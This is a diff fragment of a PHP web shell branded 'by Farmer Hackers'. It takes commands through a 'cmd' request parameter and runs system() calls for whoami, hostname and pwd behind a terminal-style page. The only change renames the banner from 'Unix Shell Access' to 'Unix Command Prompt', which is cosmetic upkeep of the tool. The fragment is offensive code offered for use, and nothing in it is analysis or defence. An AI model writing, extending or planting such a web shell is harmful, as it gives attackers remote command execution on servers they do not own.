@@ -72,7 +72,7 @@ if(!isset($_REQUEST['cmd'])):?>
     </head>
     <body>
     	<div class="container">
-    		<div class="copyright">Unix Shell Access by Farmer Hackers</div>
+    		<div class="copyright">Unix Command Prompt by Farmer Hackers</div>
     		<form class="ligne-commande"><input type="text" class="commandeInput" placeholder=""></form>
     		<div class="commandeRow active">
     			<span class="user"><?php system("whoami");?></span>@<span class="hostname"><?php system("hostname");?></span><span class="path"><?php system("pwd");?></span><span> ></span><span class="request"></span></div>
